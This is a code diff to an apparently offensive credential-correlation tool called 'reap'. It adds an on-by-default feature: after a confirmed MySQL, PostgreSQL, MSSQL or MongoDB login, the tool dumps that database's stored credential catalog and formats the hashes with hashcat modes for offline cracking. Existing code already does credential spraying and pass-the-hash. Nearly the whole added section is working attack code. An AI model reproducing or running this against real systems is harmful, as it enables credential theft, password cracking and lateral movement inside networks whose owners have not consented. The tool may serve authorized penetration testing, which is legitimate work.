@@ -17,10 +17,12 @@ probed once then abandoned, and the constructor exposes ``no_spray``,
 """
 from __future__ import annotations
 
+import os
 import socket
 import time
 from typing import Optional
 
+from .models import Credential
 from .patterns import nt_hash
 from .store import LootStore
 from .transport.ssh import SSHSession
@@ -43,6 +45,7 @@ _CAP_ACTIONS = {
 # Which service protos each credential kind is worth testing against.
 _PASSWORD_PROTOS = {"ssh", "winrm", "smb", "mysql", "postgres", "mongodb", "mssql", "ftp"}
 _HASH_PROTOS = {"winrm", "smb"}                       # pass-the-hash targets
+_DUMP_PROTOS = {"mysql", "postgres", "mssql", "mongodb"}   # dump the cred catalog once in
 _DEFAULT_PORTS = {"ssh": 22, "winrm": 5985, "smb": 445, "mysql": 3306,
                   "postgres": 5432, "mongodb": 27017, "mssql": 1433, "ftp": 21}
 _EMPTY_LM = "aad3b435b51404eeaad3b435b51404ee"        # blank LM half for PtH
@@ -51,13 +54,16 @@ _EMPTY_LM = "aad3b435b51404eeaad3b435b51404ee"        # blank LM half for PtH
 class CorrelationEngine:
     def __init__(self, store: LootStore, timeout: int = 8, max_users: int = 25,
                  no_spray: bool = False, max_attempts_per_host: Optional[int] = None,
-                 delay: float = 0.0):
+                 delay: float = 0.0, no_dump: bool = False):
         self.store = store
         self.timeout = timeout
         self.max_users = max_users
         self.no_spray = no_spray                       # only test a cred's own username
         self.max_attempts_per_host = max_attempts_per_host
         self.delay = delay
+        # After confirming a DB login, dump the credential catalog for offline
+        # cracking. On by default; opt out with no_dump=True or REAP_NO_DBDUMP.
+        self.no_dump = no_dump or bool(os.environ.get("REAP_NO_DBDUMP"))
         self._seen: set[tuple] = set()                 # dedup (proto,host,port,user,secret)
         self._reach: dict[tuple, bool] = {}            # (host,port) reachability cache
         self._attempts: dict[str, int] = {}            # per-host attempt counter
@@ -103,6 +109,10 @@ class CorrelationEngine:
                     self.store.mark_verified(cred["id"], svc["id"])
                     results.append(self._emit_reuse(cred, svc, user,
                                                     pth=(kind == "hash")))
+                    if svc["proto"] in _DUMP_PROTOS and not self.no_dump:
+                        results += self._db_dump(svc["proto"], self._target(svc),
+                                                 svc.get("port"), user,
+                                                 cred["secret"], svc)
         return results
 
     # -- helpers ---------------------------------------------------------------
@@ -372,6 +382,177 @@ class CorrelationEngine:
                 client.close()
         except Exception:
             pass
+
+    # -- DB credential-catalog dump -------------------------------------------
+    # After a DB login is confirmed, reuse it to read the DB's *own* credential
+    # catalog (mysql.user / pg_shadow / sys.sql_logins / mongo system.users) — the
+    # hashes an attacker cracks for lateral movement. Bounded to the auth catalog,
+    # not app data, so it stays loot-collection (reap's remit), not exfiltration.
+    _DUMP_CAP = 500
+
+    def _db_dump(self, proto, host, port, user, secret, svc) -> list[dict]:
+        if not host:
+            return []
+        try:
+            rows = getattr(self, f"_dump_{proto}")(host, port, user, secret)
+        except Exception:
+            return []          # low-priv login / driver missing / catalog denied
+        if not rows:
+            return []
+        added = 0
+        for uname, sec, meta in rows:
+            if not sec:
+                continue
+            self.store.add_credential(
+                Credential(kind=meta.get("kind", "hash"), secret=sec, username=uname,
+                           source=f"{proto} dump @ {host} (as {user})", metadata=meta),
+                host_id=svc.get("host_id"))
+            added += 1
+        if not added:
+            return []
+        self.store.add_finding(
+            ftype="credential", severity="high",
+            title=f"DB credential dump: {added} accounts from {proto} on {host}",
+            detail=f"authenticated as '{user}' and read the {proto} credential catalog "
+                   f"— {added} account hashes stored for offline cracking "
+                   f"('export creds' / hashcat).",
+            source_module="correlation", host_id=svc.get("host_id"))
+        return [{"type": "db_dump", "proto": proto, "host": host,
+                 "count": added, "user": user}]
+
+    @staticmethod
+    def _hstr(h) -> str:
+        return h.decode("utf-8", "replace") if isinstance(h, (bytes, bytearray)) else str(h)
+
+    @staticmethod
+    def _classify_db_hash(proto: str, h) -> tuple:
+        """(hash_type, hashcat_mode) — mode set only where we're confident."""
+        s = CorrelationEngine._hstr(h)
+        if proto == "mysql":
+            if s.startswith("*") and len(s) == 41:
+                return ("mysql_native", "300")
+            if s.startswith("$A$"):
+                return ("mysql_caching_sha2", "")
+            return ("mysql", "")
+        if proto == "postgres":
+            if s.startswith("md5"):
+                return ("postgres_md5", "12")
+            if s.upper().startswith("SCRAM-SHA-256"):
+                return ("postgres_scram_sha256", "28600")
+            return ("postgres", "")
+        if proto == "mssql":
+            low = s.lower()
+            if low.startswith("0x0200"):
+                return ("mssql_2012", "1731")
+            if low.startswith("0x0100"):
+                return ("mssql_2005", "132")
+            return ("mssql", "")
+        return (proto, "")
+
+    def _meta(self, proto, h) -> dict:
+        htype, mode = self._classify_db_hash(proto, h)
+        return {"kind": "hash", "proto": proto, "hash_type": htype,
+                "hashcat_mode": mode, "via": "db_dump"}
+
+    def _dump_mysql(self, host, port, user, secret) -> list:
+        try:
+            import pymysql
+        except ImportError:
+            return []
+        conn = None
+        try:
+            conn = pymysql.connect(host=host, port=int(port or 3306), user=user,
+                                   password=secret, connect_timeout=self.timeout)
+            cur = conn.cursor()
+            # Column varies by engine/version: MySQL 5.7+ uses authentication_string,
+            # MariaDB keeps the native hash in Password (authentication_string blank).
+            # Select whatever columns exist and take the first non-empty per row.
+            rows = None
+            for q in ("SELECT User, authentication_string, Password FROM mysql.user",
+                      "SELECT User, authentication_string FROM mysql.user",
+                      "SELECT User, Password FROM mysql.user"):
+                try:
+                    cur.execute(f"{q} LIMIT {self._DUMP_CAP}")
+                    rows = cur.fetchall()
+                    break
+                except Exception:
+                    continue
+            out = []
+            for row in rows or []:
+                uname = self._hstr(row[0])
+                h = next((self._hstr(c).strip() for c in row[1:]
+                          if self._hstr(c).strip()), "")
+                if h:
+                    out.append((uname, h, self._meta("mysql", h)))
+            return out
+        finally:
+            self._safe_close(conn)
+
+    def _dump_postgres(self, host, port, user, secret) -> list:
+        try:
+            import psycopg2
+        except ImportError:
+            return []
+        conn = None
+        try:
+            conn = psycopg2.connect(host=host, port=int(port or 5432), user=user,
+                                    password=secret, connect_timeout=self.timeout)
+            cur = conn.cursor()
+            cur.execute("SELECT usename, passwd FROM pg_shadow "
+                        f"WHERE passwd IS NOT NULL LIMIT {self._DUMP_CAP}")   # superuser
+            return [(self._hstr(u), self._hstr(h), self._meta("postgres", h))
+                    for u, h in cur.fetchall() if h]
+        finally:
+            self._safe_close(conn)
+
+    def _dump_mssql(self, host, port, user, secret) -> list:
+        try:
+            import pymssql
+        except ImportError:
+            return []
+        conn = None
+        try:
+            conn = pymssql.connect(server=host, port=str(int(port or 1433)), user=user,
+                                   password=secret, login_timeout=self.timeout)
+            cur = conn.cursor()
+            cur.execute("SELECT name, CONVERT(VARCHAR(512), password_hash, 1) "
+                        "FROM sys.sql_logins WHERE password_hash IS NOT NULL")  # CONTROL SERVER
+            return [(self._hstr(u), self._hstr(h), self._meta("mssql", h))
+                    for u, h in cur.fetchall() if h]
+        finally:
+            self._safe_close(conn)
+
+    def _dump_mongodb(self, host, port, user, secret) -> list:
+        try:
+            from pymongo import MongoClient
+        except ImportError:
+            return []
+        cl = None
+        out = []
+        try:
+            cl = MongoClient(host=host, port=int(port or 27017), username=user,
+                             password=secret,
+                             serverSelectionTimeoutMS=self.timeout * 1000)
+            for doc in cl.admin.system.users.find({}, limit=self._DUMP_CAP):
+                uname = doc.get("user")
+                creds = doc.get("credentials") or {}
+                scram = creds.get("SCRAM-SHA-256") or creds.get("SCRAM-SHA-1")
+                if not (uname and scram):
+                    continue
+                sha256 = "SCRAM-SHA-256" in creds
+                need = ("iterationCount", "salt", "storedKey")
+                if not all(k in scram for k in need):
+                    continue
+                # hashcat mongodb-scram: $mongodb-scram$<0|1>$user$iter$b64salt$b64storedKey
+                h = (f"$mongodb-scram${'1' if sha256 else '0'}${uname}$"
+                     f"{scram['iterationCount']}${scram['salt']}${scram['storedKey']}")
+                out.append((uname, h, {
+                    "kind": "hash", "proto": "mongodb", "via": "db_dump",
+                    "hash_type": f"mongodb_scram_sha{'256' if sha256 else '1'}",
+                    "hashcat_mode": "24200" if sha256 else "24100"}))
+            return out
+        finally:
+            self._safe_close(cl)
 
     def _emit_reuse(self, cred: dict, svc: dict, user: str, pth: bool = False) -> dict:
         host = self._target(svc)
